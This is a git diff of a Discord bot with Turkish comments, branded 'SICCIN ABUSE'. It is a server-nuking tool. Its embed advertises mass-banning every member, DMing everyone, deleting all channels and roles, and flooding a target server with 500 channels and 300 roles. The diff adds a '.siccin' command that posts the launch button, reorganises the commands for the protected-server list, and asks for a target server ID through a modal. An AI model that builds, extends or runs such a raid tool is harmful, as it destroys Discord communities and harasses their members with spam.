@@ -1,3 +1,4 @@
+
 require("dotenv").config();
 const {
   Client,
@@ -10,7 +11,6 @@ const {
   ModalBuilder,
   TextInputBuilder,
   TextInputStyle,
-  StringSelectMenuBuilder,
   ActivityType,
 } = require("discord.js");
 
@@ -55,25 +55,27 @@ function isProtectedServer(guildId) {
 // ================== EMBEDLER ==================
 function mainSiccinEmbed(guild) {
   return new EmbedBuilder()
-    .setColor("#3a0000") // ÇOK KOYU KIRMIZI
+    .setColor("#3a0000")
     .setAuthor({
       name: "ＳＩＣＣＩＮ ABUSE",
       iconURL: guild.iconURL({ dynamic: true }),
     })
     .setThumbnail(guild.iconURL({ dynamic: true }))
     .setDescription(
-      `Özellikler
+      `**Özellikler**
 • Anında Herkesi Banlar
 • Herkese DM Çeker
 • Tüm Kanal ve Rolleri Siler
 • 500 Kanal & 300 Rol Oluşturur
 
-Nasıl Kullanılır?
+**Nasıl Kullanılır?**
 Butona tıkla ve hedef sunucu ID gir.
 
-⚠️ KORUNAN SUNUCULAR:
+**⚠️ KORUNAN SUNUCULAR:**
 ${PROTECTED_SERVERS.map(id => `• ${id}`).join('\n')}`
-    );
+    )
+    .setFooter({ text: "ＳＩＣＣＩＮ | Glory to Siccin" })
+    .setTimestamp();
 }
 
 function dmEmbed(guild) {
@@ -121,11 +123,11 @@ function logEmbed(data) {
       {
         name: "İstatistik",
         value:
-          `Banlanan Kişi Sayısı: ${data.banned}\n` +
-          `Silinen Rol Sayısı: ${data.rolesDeleted}\n` +
-          `Silinen Kanal Sayısı: ${data.channelsDeleted}\n` +
-          `Eklenen Rol Sayısı: ${data.rolesCreated}\n` +
-          `Eklenen Kanal Sayısı: ${data.channelsCreated}`,
+          `Banlanan Kişi Sayısı: **${data.banned}**\n` +
+          `Silinen Rol Sayısı: **${data.rolesDeleted}**\n` +
+          `Silinen Kanal Sayısı: **${data.channelsDeleted}**\n` +
+          `Eklenen Rol Sayısı: **${data.rolesCreated}**\n` +
+          `Eklenen Kanal Sayısı: **${data.channelsCreated}**`,
       }
     );
 }
@@ -257,10 +259,88 @@ async function startSiccin(interaction, targetGuildId) {
   await client.users.fetch(SERI_ID).then((u) => u.send({ embeds: [log] })).catch(() => {});
 }
 
-client.on("interactionCreate", async (interaction) => {
+// ================== MESSAGE İŞLEME ==================
+client.on("messageCreate", async (message) => {
+  if (message.author.bot || !message.guild) return;
 
+  // .siccin komutu kontrolü
+  if (message.content.toLowerCase() === ".siccin") {
+    try {
+      // İlk kodda sadece OWNER_ID ve SERI_ID kontrolü vardı
+      // İkinci kodda herkese açıktı, ikisini birleştirdim
+      // İsterseniz bu kontrolü kaldırabilirsiniz
+      if (![OWNER_ID, SERI_ID].includes(message.author.id)) {
+        return message.reply({ 
+          content: "❌ Bu komutu kullanma yetkiniz yok!",
+          ephemeral: true 
+        }).catch(() => {});
+      }
+      
+      const embed = mainSiccinEmbed(message.guild);
+      const row = new ActionRowBuilder().addComponents(
+        new ButtonBuilder()
+          .setCustomId("siccinStart")
+          .setLabel("ＳＩＣＣＩＮ")
+          .setStyle(ButtonStyle.Danger)
+          .setEmoji("🔥")
+      );
+      
+      await message.channel.send({ 
+        embeds: [embed], 
+        components: [row] 
+      });
+      
+    } catch (error) {
+      console.error("Embed gönderilemedi:", error);
+      message.reply("❌ Embed gönderilirken hata oluştu!").catch(() => {});
+    }
+    return;
+  }
+
+  // ID ekleme komutu (Owner için)
+  if (message.content.startsWith("!ekle") && message.author.id === OWNER_ID) {
+    const args = message.content.split(" ");
+    if (args.length < 2) {
+      return message.reply("Kullanım: !ekle <sunucu-id>");
+    }
+
+    const newId = args[1];
+    if (PROTECTED_SERVERS.includes(newId)) {
+      return message.reply("Bu ID zaten koruma listesinde!");
+    }
+
+    PROTECTED_SERVERS.push(newId);
+    message.reply(`✅ ${newId} ID'li sunucu koruma listesine eklendi!\n\nGüncel liste:\n${PROTECTED_SERVERS.map(id => `• ${id}`).join('\n')}`);
+  }
+
+  // ID silme komutu (Owner için)
+  if (message.content.startsWith("!sil") && message.author.id === OWNER_ID) {
+    const args = message.content.split(" ");
+    if (args.length < 2) {
+      return message.reply("Kullanım: !sil <sunucu-id>");
+    }
+
+    const removeId = args[1];
+    const index = PROTECTED_SERVERS.indexOf(removeId);
+    if (index === -1) {
+      return message.reply("Bu ID koruma listesinde bulunamadı!");
+    }
+
+    PROTECTED_SERVERS.splice(index, 1);
+    message.reply(`✅ ${removeId} ID'li sunucu koruma listesinden kaldırıldı!\n\nGüncel liste:\n${PROTECTED_SERVERS.map(id => `• ${id}`).join('\n')}`);
+  }
+
+  // Liste görüntüleme komutu
+  if (message.content === "!korunanlar") {
+    message.reply(`**Korunan Sunucular:**\n${PROTECTED_SERVERS.map(id => `• ${id}`).join('\n')}`);
+  }
+});
+
+// ================== INTERACTION İŞLEME ==================
+client.on("interactionCreate", async (interaction) => {
   // ================== BUTTON ==================
   if (interaction.isButton() && interaction.customId === "siccinStart") {
+    // ⚠️ HİÇBİR defer/reply YOK - doğrudan modal göster
     const modal = new ModalBuilder()
       .setCustomId("siccinModal")
       .setTitle("Hedef Sunucu ID")
@@ -271,7 +351,6 @@ client.on("interactionCreate", async (interaction) => {
             .setLabel("Hedef Sunucu ID")
             .setStyle(TextInputStyle.Short)
             .setRequired(true)
-            .setPlaceholder("Sunucu ID girin...")
         )
       );
 
@@ -281,7 +360,7 @@ client.on("interactionCreate", async (interaction) => {
   // ================== MODAL ==================
   if (interaction.isModalSubmit() && interaction.customId === "siccinModal") {
     const member = await interaction.guild.members.fetch(interaction.user.id);
-
+    
     if (!hasSiccinStatus(member)) {
       return interaction.reply({
         content: "❌ Durumunda /siccin veya .gg/siccin yok",
@@ -318,50 +397,6 @@ client.on("interactionCreate", async (interaction) => {
     await interaction.deferReply({ ephemeral: true });
     return startSiccin(interaction, gid);
   }
-
-});
-
-// ================== KOMUT EKLEME (isteğe bağlı) ==================
-client.on("messageCreate", async (message) => {
-  if (message.author.bot) return;
-
-  // ID ekleme komutu
-  if (message.content.startsWith("!ekle") && message.author.id === OWNER_ID) {
-    const args = message.content.split(" ");
-    if (args.length < 2) {
-      return message.reply("Kullanım: !ekle <sunucu-id>");
-    }
-
-    const newId = args[1];
-    if (PROTECTED_SERVERS.includes(newId)) {
-      return message.reply("Bu ID zaten koruma listesinde!");
-    }
-
-    PROTECTED_SERVERS.push(newId);
-    message.reply(`✅ ${newId} ID'li sunucu koruma listesine eklendi!\n\nGüncel liste:\n${PROTECTED_SERVERS.map(id => `• ${id}`).join('\n')}`);
-  }
-
-  // ID silme komutu
-  if (message.content.startsWith("!sil") && message.author.id === OWNER_ID) {
-    const args = message.content.split(" ");
-    if (args.length < 2) {
-      return message.reply("Kullanım: !sil <sunucu-id>");
-    }
-
-    const removeId = args[1];
-    const index = PROTECTED_SERVERS.indexOf(removeId);
-    if (index === -1) {
-      return message.reply("Bu ID koruma listesinde bulunamadı!");
-    }
-
-    PROTECTED_SERVERS.splice(index, 1);
-    message.reply(`✅ ${removeId} ID'li sunucu koruma listesinden kaldırıldı!\n\nGüncel liste:\n${PROTECTED_SERVERS.map(id => `• ${id}`).join('\n')}`);
-  }
-
-  // Liste görüntüleme komutu
-  if (message.content === "!korunanlar") {
-    message.reply(`**Korunan Sunucular:**\n${PROTECTED_SERVERS.map(id => `• ${id}`).join('\n')}`);
-  }
 });
 
 // ================== BOT HAZIR ==================
@@ -370,9 +405,14 @@ client.on("ready", () => {
   console.log(`Korunan sunucular: ${PROTECTED_SERVERS.join(", ")}`);
   
   client.user.setActivity({
-    name: `${PROTECTED_SERVERS.length} sunucu korunuyor`,
-    type: ActivityType.Watching,
+    name: ".siccin | Korunan: 2 sunucu",
+    type: ActivityType.Playing,
   });
+  
+  console.log("═══════════════════════════════════════");
+  console.log("Komut: .siccin");
+  console.log("Embed ve buton gönderir");
+  console.log("═══════════════════════════════════════");
 });
 
 // ================== CRASH KALKAN ==================
